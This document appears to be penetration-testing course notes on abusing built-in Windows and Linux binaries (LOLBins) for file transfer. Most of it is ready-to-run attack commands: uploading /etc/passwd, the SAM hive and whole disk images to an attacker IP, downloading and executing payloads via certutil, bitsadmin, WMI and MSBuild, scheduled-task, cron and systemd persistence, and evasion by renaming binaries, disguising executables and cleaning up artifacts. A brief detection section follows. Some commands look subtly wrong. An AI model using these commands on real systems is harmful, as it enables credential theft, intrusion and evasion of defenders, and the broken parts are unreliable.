# Living off The Land File Transfers

## Introduction

The phrase "Living off the land" was coined by Christopher Campbell (@obscuresec) & Matt Graeber (@mattifestation) at DerbyCon 3.

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. These are legitimate system binaries that can be abused for malicious purposes.

**Key Resources:**
- **LOLBAS Project** - For Windows Binaries (https://lolbas-project.github.io/)
- **GTFOBins** - For Linux Binaries (https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:
- **Download** - Retrieve files from remote sources
- **Upload** - Send files to remote destinations
- **Command Execution** - Execute arbitrary commands
- **File Read** - Read sensitive files
- **File Write** - Write files to disk
- **Bypasses** - Bypass security controls

This section focuses on using LOLBAS and GTFOBins projects and provides examples for download and upload functions on Windows & Linux systems.

## Windows Living off The Land Binaries (LOLBAS)

### CertReq.exe

**Description:** Certificate Request utility that can be used to upload files via HTTP POST.

**Upload Files:**
```cmd
# Start Netcat listener on attack host
nc -lvnp 8000

# Upload file from Windows target
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

**Expected Output:**
```
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

**Netcat Session Output:**
```http
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**⚠️ Note:** If you get an error when running certreq.exe, the version you are using may not contain the -Post parameter.

### Bitsadmin

**Description:** Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares.

**Download File:**
```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**PowerShell BITS Transfer:**
```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**Advanced BITS Usage:**
```powershell
# Download with credentials
Start-BitsTransfer -Source "http://10.10.10.32:8000/file.txt" -Destination "C:\temp\file.txt" -Credential (Get-Credential)

# Download through proxy
Start-BitsTransfer -Source "http://10.10.10.32:8000/file.txt" -Destination "C:\temp\file.txt" -ProxyUsage SystemDefault

# Resume interrupted transfer
Resume-BitsTransfer -Name "MyTransfer"
```

### Certutil

**Description:** Certificate utility that can download arbitrary files. Found by Casey Smith (@subTee).

**Download File:**
```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

**Base64 Decode:**
```cmd
# Decode base64 file
certutil -decode encoded_file.txt decoded_file.exe
```

**URL Cache Download:**
```cmd
certutil.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe nc.exe
```

**⚠️ Note:** The Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

### Expand.exe

**Description:** Built-in utility for extracting compressed files.

**Download and Extract:**
```cmd
# Download cabinet file
expand.exe \\webdav\folder\file.cab c:\ADS\file.cab

# Extract cabinet file
expand.exe -F:* c:\ADS\file.cab c:\ADS\
```

### Esentutl.exe

**Description:** Extensible Storage Engine (ESE) database utility.

**Download File:**
```cmd
esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
```

### Findstr.exe

**Description:** String search utility that can read files.

**Read Remote Files:**
```cmd
findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
```

### Replace.exe

**Description:** File replacement utility.

**Download File:**
```cmd
replace.exe \\webdav.folder.com\folder\invoice.pdf c:\ADS\ /A
```

### Makecab.exe

**Description:** Cabinet file creation utility.

**Upload File (via UNC):**
```cmd
makecab \\webdavserver\webdav\nc.exe \\webdavserver\webdav\nc.cab
```

### Print.exe

**Description:** Print command that can download files.

**Download File:**
```cmd
print /D:\\webdavserver\share\nc.exe \\webdavserver\share\nc.exe
```

### Reg.exe

**Description:** Registry editor that can save/export files.

**Export Registry to Remote:**
```cmd
reg export HKLM\SAM \\webdavserver\folder\SAM
```

### Xcopy.exe

**Description:** Extended copy utility.

**Download File:**
```cmd
xcopy \\webdavserver\webdav\nc.exe c:\ADS\nc.exe
```

## Linux Living off The Land Binaries (GTFOBins)

### OpenSSL

**Description:** Cryptographic toolkit that can create SSL connections for file transfer.

**Setup SSL Server (Attack Host):**
```bash
# Create certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start SSL server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**Download File (Target Host):**
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

**Upload File via SSL:**
```bash
# Target sends file
cat /etc/passwd | openssl s_client -quiet -connect 10.10.10.32:443

# Attack host receives
openssl s_server -quiet -accept 443 -cert certificate.pem -key key.pem > received_passwd
```

### Wget

**Description:** Web file downloader (if available).

**Download File:**
```bash
wget http://10.10.10.32:8000/LinEnum.sh
```

**Upload via POST:**
```bash
wget --post-file=/etc/passwd http://10.10.10.32:8000/upload
```

### Curl

**Description:** Command-line HTTP client.

**Download File:**
```bash
curl -o LinEnum.sh http://10.10.10.32:8000/LinEnum.sh
```

**Upload File:**
```bash
curl -X POST -F "file=@/etc/passwd" http://10.10.10.32:8000/upload
```

### Nc (Netcat)

**Description:** Network utility for reading/writing network connections.

**Download File:**
```bash
# Attack host
nc -l -p 8000 < file_to_send.txt

# Target host
nc 10.10.10.32 8000 > received_file.txt
```

**Upload File:**
```bash
# Attack host
nc -l -p 8000 > received_file.txt

# Target host
nc 10.10.10.32 8000 < file_to_send.txt
```

### Socat

**Description:** Extended netcat with additional features.

**Download File:**
```bash
# Server
socat TCP-LISTEN:8000,reuseaddr,fork OPEN:/tmp/file.txt,rdonly

# Client
socat TCP:10.10.10.32:8000 OPEN:/tmp/received_file.txt,creat
```

### SSH/SCP

**Description:** Secure Shell utilities.

**Download File:**
```bash
scp user@10.10.10.32:/tmp/file.txt /tmp/
```

**Upload File:**
```bash
scp /tmp/file.txt user@10.10.10.32:/tmp/
```

### Base64

**Description:** Base64 encoding/decoding utility.

**Encode and Transfer:**
```bash
# Encode file
base64 /etc/passwd | nc 10.10.10.32 8000

# Receive and decode
nc -l -p 8000 | base64 -d > passwd_copy
```

### Xxd

**Description:** Hex dump utility.

**Transfer via Hex:**
```bash
# Encode
xxd -p /etc/passwd | nc 10.10.10.32 8000

# Decode
nc -l -p 8000 | xxd -r -p > passwd_copy
```

### Tar

**Description:** Archive utility.

**Transfer Archive:**
```bash
# Create and send
tar czf - /etc/ | nc 10.10.10.32 8000

# Receive and extract
nc -l -p 8000 | tar xzf - -C /tmp/
```

### DD

**Description:** Data duplicator/converter.

**Transfer Raw Data:**
```bash
# Send disk image
dd if=/dev/sda | nc 10.10.10.32 8000

# Receive disk image
nc -l -p 8000 | dd of=/tmp/disk.img
```

## Advanced Living off The Land Techniques

### Windows Registry as Storage

**Store Data in Registry:**
```cmd
# Store base64 encoded file in registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion" /v "Update" /t REG_SZ /d "base64_encoded_data"

# Retrieve and decode
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion" /v "Update" | findstr "Update" | certutil -decode - decoded_file.exe
```

### Alternate Data Streams (ADS)

**Hide Files in ADS:**
```cmd
# Store file in ADS
type nc.exe > legitimate_file.txt:nc.exe

# Retrieve file from ADS
expand legitimate_file.txt:nc.exe nc_recovered.exe
```

### WMI for File Transfer

**Download via WMI:**
```powershell
# Create WMI object for HTTP request
$wmi = [WMIClass]"Win32_Process"
$wmi.Create("powershell.exe -c `"(New-Object Net.WebClient).DownloadFile('http://10.10.10.32:8000/nc.exe','C:\temp\nc.exe')`"")
```

### MSBuild for Execution

**Download and Execute via MSBuild:**
```xml
<!-- Save as download.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Download">
    <Exec Command="powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://10.10.10.32:8000/nc.exe','C:\temp\nc.exe')" />
  </Target>
</Project>
```

```cmd
msbuild.exe download.xml
```

### Linux Systemd for Persistence

**Create Service for File Transfer:**
```bash
# Create service file
cat > /tmp/download.service << EOF
[Unit]
Description=Download Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -o /tmp/payload http://10.10.10.32:8000/payload'

[Install]
WantedBy=multi-user.target
EOF

# Run service
systemctl --user daemon-reload
systemctl --user start download.service
```

## Steganography with LOLBins

### Hide Data in Images

**Windows - Using forfiles:**
```cmd
# Hide data in image metadata
forfiles /p C:\temp /m *.jpg /c "cmd /c echo secret_data >> @file:metadata"
```

**Linux - Using steghide:**
```bash
# Hide file in image
steghide embed -cf cover.jpg -ef secret.txt -p password123

# Extract file from image
steghide extract -sf cover.jpg -p password123
```

## Detection Evasion Techniques

### Rename Binaries

**Windows:**
```cmd
# Copy and rename suspicious binaries
copy C:\Windows\System32\certutil.exe C:\temp\update.exe
update.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe
```

**Linux:**
```bash
# Copy and rename binaries
cp /usr/bin/wget /tmp/systemupdate
/tmp/systemupdate http://10.10.10.32:8000/payload
```

### Use Legitimate File Extensions

**Disguise Executables:**
```cmd
# Rename executable to appear as document
copy nc.exe important_document.pdf.exe

# Use double extension
copy nc.exe report.txt.exe
```

### Time-based Transfers

**Schedule Transfers:**
```cmd
# Windows - Use schtasks
schtasks /create /tn "System Update" /tr "certutil.exe -urlcache -split -f http://10.10.10.32:8000/update.exe" /sc daily /st 02:00

# Linux - Use cron
echo "0 2 * * * wget -q http://10.10.10.32:8000/update" | crontab -
```

## Defensive Considerations

### Monitoring LOLBins Usage

**Windows Event Logs:**
- Monitor Process Creation Events (Event ID 4688)
- Monitor PowerShell Script Block Logging (Event ID 4104)
- Monitor Network Connections (Event ID 3 - Sysmon)

**Linux Monitoring:**
- Monitor syscalls with auditd
- Use process monitoring tools (ps, top, htop)
- Monitor network connections (netstat, ss)

### Common Detection Signatures

**Suspicious Command Lines:**
```cmd
# Certutil with URL
certutil.*-urlcache.*-split.*-f.*http

# Bitsadmin with transfer
bitsadmin.*transfer.*http

# PowerShell with download
powershell.*downloadstring.*http
```

### Mitigation Strategies

1. **Application Whitelisting** - Prevent unauthorized binary execution
2. **Network Monitoring** - Monitor outbound connections
3. **Behavioral Analysis** - Detect unusual binary usage patterns
4. **Endpoint Detection** - Use EDR solutions to detect LOLBin abuse
5. **User Education** - Train users to recognize suspicious activities

## Best Practices for Penetration Testers

### Reconnaissance Phase

1. **Enumerate available binaries** on target systems
2. **Check binary versions** and capabilities
3. **Identify network restrictions** that may affect transfers
4. **Research alternative methods** for detected/blocked binaries

### Execution Phase

1. **Start with least suspicious methods** first
2. **Use legitimate-looking file names** and extensions
3. **Time transfers appropriately** to avoid detection
4. **Clean up artifacts** after successful transfers
5. **Document successful techniques** for future use

### Testing Methodology

```bash
# Quick binary availability check
which wget curl nc openssl base64 python perl ruby

# Windows binary check
where certutil bitsadmin powershell wmic
```

## Troubleshooting Common Issues

### Certificate Errors

**Bypass SSL Certificate Validation:**
```bash
# Curl
curl -k https://10.10.10.32:8000/file.txt

# Wget
wget --no-check-certificate https://10.10.10.32:8000/file.txt

# OpenSSL
openssl s_client -connect 10.10.10.32:443 -verify_return_error
```

### Network Restrictions

**Test Connectivity:**
```bash
# Test HTTP/HTTPS
curl -I http://10.10.10.32:8000/
curl -I https://10.10.10.32:8443/

# Test different ports
nc -zv 10.10.10.32 80 443 8000 8080 8443
```

### Binary Not Found

**Alternative Binary Search:**
```bash
# Linux - Find alternatives
find /usr/bin /bin -name "*curl*" -o -name "*wget*" -o -name "*nc*"

# Windows - Search for alternatives
dir /s /b C:\Windows\System32\*cert*.exe
dir /s /b C:\Windows\System32\*bits*.exe
```

## Key Takeaways

1. **LOLBins are powerful** - Legitimate binaries can perform file transfers
2. **Stealth advantage** - Using system binaries is less suspicious
3. **Multiple options available** - Always have backup methods ready
4. **Environment awareness** - Different systems have different binaries
5. **Detection evasion** - Rename binaries and use legitimate-looking names
6. **Clean up artifacts** - Remove evidence after successful transfers
7. **Document techniques** - Keep notes on successful methods
8. **Stay updated** - New LOLBins are discovered regularly

## References

- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)
- [Living Off The Land Binaries and Scripts (and also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
- [ATT&CK Framework - Living Off The Land](https://attack.mitre.org/techniques/T1105/)
- [Microsoft Documentation - Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [NIST - Application Whitelisting](https://csrc.nist.gov/publications/detail/sp/800-167/final) 